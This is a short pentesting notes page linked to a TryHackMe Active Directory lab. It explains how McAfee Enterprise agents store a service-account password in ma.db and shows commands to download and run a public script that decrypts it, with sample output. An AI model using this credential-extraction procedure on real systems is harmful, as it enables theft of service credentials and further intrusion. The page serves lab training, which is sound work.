# McAfee Credentials

[![breachingad](../../../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)

<div class="row row-cols-lg-2"><div>

McAfee Enterprise stores in `C:\ProgramData\McAfee\Agent\DB\ma.db` the credentials used by the agent to connect back to the orchestrator.

With a local administrator access, we can read it and extract the service account username and password.

```ps
$ sqlitebrowser ma.db
```

Look inside the `AGENT_REPOSITORIES` table.
</div><div>

We can decrypt it using [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/tree/master) <small>(0.1k ⭐)</small>:

```ps
$ wget "https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py"
$ python -m venv venv && source venv/bin/activate
$ pip3 install pycryptodome
$ python mcafee_sitelist_pwd_decrypt.py "jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=="
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```
</div></div>